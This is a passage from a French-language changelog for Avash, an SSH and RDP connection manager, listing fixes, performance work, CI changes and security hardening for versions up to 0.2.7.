  vide, ou écran « Aucune session » par-dessus une session vivante.
- Les modales partageaient un résolveur unique : une seconde demande abandonnait
  la première à jamais, laissant un onglet figé.
- La connexion se poursuivait après la fermeture de l'onglet, jusqu'à ouvrir une
  demande de mot de passe pour un onglet qui n'existait plus.
- Renommer ou supprimer un dossier avalait silencieusement les échecs.
- Une fenêtre sans propriétaire à l'ouverture d'un tunnel laissait un tunnel
  orphelin, ou en installait un que l'utilisateur venait d'arrêter.
- La fin d'une session RDP ne libérait ni le processus ni l'observateur de
  taille ; les sessions mortes restaient proposées comme cibles de snippet.

### Performance

- **Téléchargement SFTP en bandes parallèles** : il n'avait aucune requête en
  vol et plafonnait à un bloc par aller-retour — environ huit fois plus lent que
  le téléversement sur le même lien.
- **`TCP_NODELAY`** : russh laisse l'algorithme de Nagle actif par défaut, ce
  qui retenait chaque frappe jusqu'à l'accusé précédent.
- **Un onglet RDP masqué** continuait d'accuser réception de chaque trame : le
  processus poussait des images entières (8 Mo en 1080p) vers un canvas
  invisible.
- La sonde d'OS distante bloquait le premier affichage du terminal.
- Le listing SFTP figeait plusieurs secondes sur un répertoire système.

### Ergonomie

- **La barre latérale est utilisable au clavier** : un seul arrêt de tabulation,
  les flèches à l'intérieur, Entrée pour agir, Maj+F10 pour le menu — lequel se
  parcourt aussi aux flèches et se referme à Échap en rendant le focus.
- Le filtre par tag ignorait les bureaux RDP ; il dit maintenant combien il en
  masque.
- « Mémoriser le mot de passe » ne faisait rien si « Enregistrer la connexion »
  n'était pas cochée.
- Une confirmation destructive ne pré-focalise plus son bouton rouge.
- Les badges « rebond » et « tunnels vifs », stylés depuis toujours, sont enfin
  rendus. Un alias long ne déborde plus.
- « Oublier le mot de passe » dit ce qu'il a fait.
- Une session RDP qui meurt affiche le diagnostic du processus.

### Interne

- **Les tests du processus RDP ne s'exécutaient nulle part** : hors du
  workspace, ils échappaient à `cargo test --workspace`, et l'intégration
  continue se contentait de le compiler. Ils passent désormais par les trois
  portes, et six tests s'y ajoutent.
- Le hook de pré-commit ne touchait pas au front ; `check.sh` ne construisait
  pas le processus RDP dont dépend pourtant son propre build.
- La liste des scénarios bout en bout en intégration continue était énumérative
  et avait pris du retard : elle désigne maintenant ce qui exige un serveur.
- Des tests qui ne pouvaient pas échouer ont été refaits, et le serveur SSH de
  test sait enfin refuser une authentification.
- Les attentes par durée ont laissé place à des attentes d'état.


## [0.2.7] - 2026-08-31

### Corrigé

- **Le redimensionnement de la fenêtre ralentissait fortement l'application**
  sous Linux, sans qu'aucune session soit ouverte. Profilé : WebKitGTK compose
  ses couches sur le processeur graphique et **réalloue ses tampons vidéo à
  chaque image du geste** — 42 % du temps passait dans le noyau
  (`ttm_bo_alloc_resource`, `ttm_bo_evict`, `drm_gem_handle_delete`). Le
  compositing accéléré est désormais désactivé au démarrage sous Linux : la part
  noyau tombe à 19 %, le geste redevient fluide, et le débit RDP est inchangé
  (10 images/s contre 9, dans le bruit). Réglage surchargeable par la variable
  d'environnement `WEBKIT_DISABLE_COMPOSITING_MODE`.

### Modifié

- **Les onglets RDP portent le même intitulé que les onglets SSH** : le nom du
  bureau enregistré, et « utilisateur@adresse » pour une connexion directe.
  Auparavant ils affichaient toujours « utilisateur@adresse » précédé d'une
  icône, ce qui rendait les deux protocoles inutilement dissemblables.

## [0.2.6] - 2026-08-30

### Corrigé

- **Le verrou numérique était inversé dans les sessions RDP** : il fallait
  l'éteindre côté poste pour qu'il s'active à distance. WebKitGTK ne renseigne
  pas cet état au navigateur — il répond toujours « éteint », verrou allumé ou
  non. La valeur correcte, lue auprès du système à la connexion, était donc
  écrasée dès la première frappe. Les événements clavier ne peuvent plus primer
  sur le système.

## [0.2.5] - 2026-08-30

### Corrigé

- **La mise à jour automatique peut enfin fonctionner.** Trois conditions
  manquaient, découvertes l'une après l'autre : l'adresse consultée visait un
  dépôt inexistant, aucun manifeste `latest.json` n'était publié, et le
  bundler ne produisait aucune signature faute de l'option
  `createUpdaterArtifacts`. Les trois sont réunies : les binaires publiés sont
  signés et accompagnés de leur manifeste.

*(La 0.2.4 n'a jamais été publiée : sa publication s'est arrêtée d'elle-même,
faute de signatures — exactement ce que la garde devait empêcher.)*

## [0.2.4] - 2026-08-30

### Corrigé

- **L'interface se figeait au redimensionnement de la fenêtre**, même sans
  aucune session ouverte. La barre de titre est intégrée à l'application :
  chaque image du glissé déclenchait un aller-retour vers le processus natif
  pour savoir si la fenêtre était maximisée, saturant le pont. Le rafraîchissement
  attend désormais la fin du geste.
- **La synchronisation du pavé numérique ne se déclenchait jamais.** L'état des
  verrous n'était lu que sur un événement clavier ; or une session s'ouvre le
  plus souvent à la souris, sans qu'aucune touche n'ait été frappée. L'état est
  maintenant demandé au système (diodes du clavier sous Linux, état des touches
  sous Windows), les événements clavier ne servant plus que de secours.

## [0.2.3] - 2026-08-30

### Corrigé

- **Les verrous clavier ne suivaient pas.** Un bureau distant démarrait avec ses
  propres verrous : le pavé numérique paraissait éteint alors qu'il était allumé
  sur le poste, et il fallait appuyer sur Verr.Num pour réaligner les deux.
  L'état local (numérique, majuscules, défilement) est désormais transmis à la
  connexion, au retour du focus, et dès qu'il change.

## [0.2.2] - 2026-08-30

### Corrigé

- **Clavier incomplet en RDP.** La table des scancodes s'arrêtait au verrou
  majuscule : le **pavé numérique**, les touches de fonction, les flèches et les
  touches étendues n'étaient pas transmis. **AltGr** manquait également, ce qui
  rendait inaccessibles tous les caractères de troisième niveau d'un clavier
  français — dont l'antislash (AltGr+8). La touche à gauche de Maj des claviers
  européens (« < > ») manquait aussi.
- **Une fenêtre console s'ouvrait à chaque connexion RDP sous Windows.** Le
  processus RDP est désormais lancé sans console (CREATE_NO_WINDOW).

## [0.2.1] - 2026-08-30

Première version réellement distribuée sur les deux plateformes.

### Corrigé

- **avash ne compilait pas sous Windows.** L'authentification par agent SSH
  utilisait `AgentClient::connect_env()`, une API disponible uniquement sur Unix
  (elle lit `SSH_AUTH_SOCK`). La compilation Windows échouait donc, ce qui est
  resté invisible tant qu'aucun build Windows n'avait été réellement exercé.
  Le transport de l'agent est désormais choisi selon la plateforme : socket Unix,
  ou tube nommé OpenSSH puis Pageant (PuTTY) sous Windows.
- Compilation depuis un clone neuf : le binaire du sidecar RDP, déclaré en
  ressource embarquée, doit exister avant toute compilation d'`avash-ui`. Les
  instructions du README et de CONTRIBUTING étaient inapplicables telles quelles.
- **Le RDP n'aurait pas fonctionné sous Windows** : l'application cherchait son
  processus RDP sous le nom `avash-rdp`, sans l'extension `.exe` — le fichier
  posé à côté d'elle n'était donc jamais trouvé.
- Intégration continue : le sidecar est construit avant les étapes Rust, et le
  bundle Tauri s'exécute depuis le bon répertoire.

### Ajouté

- **Attestation de provenance** des binaires publiés (Sigstore, via GitHub) :
  chacun peut prouver qu'un fichier téléchargé provient bien de ce dépôt, de ce
  commit et de notre chaîne d'intégration — vérifiable avec
  `gh attestation verify`. Cela ne remplace pas une signature Authenticode :
  l'avertissement de Windows subsiste.
- **Version portable pour Windows** : une archive à décompresser, sans
  installation ni écriture dans la base de registre.
- Garde-fou d'intégration continue : la compilation Windows du cœur est vérifiée
  à chaque poussée.

## [0.2.0] - 2026-08-30

Première version publique. Avash devient un gestionnaire de connexions
graphique complet (SSH et RDP), au-delà du cœur SSH initial.

### Ajouté

- **Gestionnaire RDP complet**, adossé à IronRDP et exécuté dans un sidecar
  isolé (`avash-rdp`) :
  - bureau distant embarqué dans l'application (canvas et entrées
    clavier/souris) ;
  - **redimensionnement natif** du bureau distant via le canal Display Control
    (DVC) : le serveur re-rend à la nouvelle résolution, sans flash noir ;
  - **presse-papiers texte bidirectionnel** (CLIPRDR) entre le poste et le
    bureau distant ;
  - **overlay de reconnexion** (« Reconnecter / Fermer l'onglet ») quand une
    session RDP se ferme ;
  - connexions RDP enregistrées (mot de passe dans le trousseau), résolution
    adaptative, plein écran (F11), prise en charge ultrawide ;
  - cadencement adaptatif anti-lag avec indicateur de qualité en direct
    (fps / débit / latence).
- **Arborescence de dossiers** pour organiser les hôtes, unifiée entre les
  connexions SSH et RDP.
- **Tunnels SSH** (redirections de ports) : création, liste, suppression.
- **Snippets** : création, liste, suppression.
- **Panneau SFTP** sur une session SSH (navigation et transfert de fichiers).
- **Mises à jour automatiques** via le plugin updater de Tauri.
- **Infrastructure de tests** :
  - ESLint typé et vérification `tsc` sur le front ;
  - garde anti-étourderie (`scripts/guard.sh`) contre les restes de mise au
    point et les dialogues natifs inopérants ;
  - suite de **18 scénarios de bout en bout** pilotant la vraie application
    (WebKitGTK) via `tauri-driver` et WebdriverIO, y compris connexion SSH,
    SFTP et RDP réelles.
- Nouvel écusson (identité visuelle) d'Avash.

### Modifié

- Transport binaire WebSocket entre l'application et le sidecar RDP
  (`ArrayBuffer` natif, ni base64 ni JSON) pour un débit maximal.
- Voyant vert dans l'arbre pour les connexions actives (SSH et RDP), et
  distinction claire entre « session ouverte » et « sélectionné au clic ».
- Les modales ne se ferment plus par un clic à l'extérieur (évite de perdre la
  saisie en cours) ; fermeture à Échap conservée.
- Configuration de build plus agressive côté Rust : `codegen-units = 1`, LTO,
  `strip`. Sidecar RDP construit avec LTO complet.
- Bundle front allégé et mise à niveau de la chaîne d'outils :
  **Vite 8**, **TypeScript 6**, `keyring` 4.2.

### Corrigé

- **Bug critique** : sous WebKitGTK/WRY, `window.confirm()` ne bloque pas et
  renvoie une `Promise` toujours vraie (et `window.prompt()` renvoie `null`).
  Les confirmations de suppression étaient donc **contournées**. Remplacées par
  des dialogues maison (`askConfirm()` / `askText()`) ; une garde interdit
  désormais les dialogues natifs.
- Redimensionnement RDP fluide : plus de flash noir ni de gel en cascade.
- Affichage correct au changement d'onglet (RDP noir, ou RDP par-dessus SSH).
- `TCP_NODELAY` sur les deux sockets du chemin RDP (entrées et petits
  rectangles d'écran envoyés sans délai).
- Remontée des erreurs du sidecar RDP jusqu'au front (échec d'authentification,
  NLA, TLS).
- Retrait de harnais de test laissés par erreur dans le front.

### Sécurité

- Vérification stricte des clés d'hôte SSH (TOFU) : refus si la clé d'hôte a
  changé, sans réapprentissage silencieux.
- Validation des champs écrits dans `~/.ssh/config` contre l'injection de
  directives (rejet des sauts de ligne et jokers).
- Mots de passe stockés uniquement dans le trousseau du système ; mot de passe
  RDP transmis au sidecar par stdin, jamais en ligne de commande.
- Diverses corrections de sécurité relevées lors d'un audit (dossiers et RDP).

[Non publié]: https://github.com/AdrienAvalon/avash/compare/v0.11.1...HEAD
[0.11.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.11.1
[0.11.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.11.0
[0.10.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.10.1
[0.10.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.10.0
[0.9.2]: https://github.com/AdrienAvalon/avash/releases/tag/v0.9.2
[0.9.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.9.1
[0.9.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.9.0
[0.8.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.8.0
[0.2.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.0
[0.2.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.1
[0.2.2]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.2
[0.2.3]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.3
[0.2.4]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.4
[0.2.5]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.5
[0.2.6]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.6
[0.2.7]: https://github.com/AdrienAvalon/avash/releases/tag/v0.2.7
[0.3.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.3.0
[0.3.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.3.1
[0.3.2]: https://github.com/AdrienAvalon/avash/releases/tag/v0.3.2
[0.3.3]: https://github.com/AdrienAvalon/avash/releases/tag/v0.3.3
[0.4.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.4.0
[0.4.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.4.1
[0.4.3]: https://github.com/AdrienAvalon/avash/releases/tag/v0.4.3
[0.5.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.5.0
[0.6.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.6.0
[0.6.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.6.1
[0.6.2]: https://github.com/AdrienAvalon/avash/releases/tag/v0.6.2
[0.7.0]: https://github.com/AdrienAvalon/avash/releases/tag/v0.7.0
[0.7.1]: https://github.com/AdrienAvalon/avash/releases/tag/v0.7.1
[0.7.2]: https://github.com/AdrienAvalon/avash/releases/tag/v0.7.2
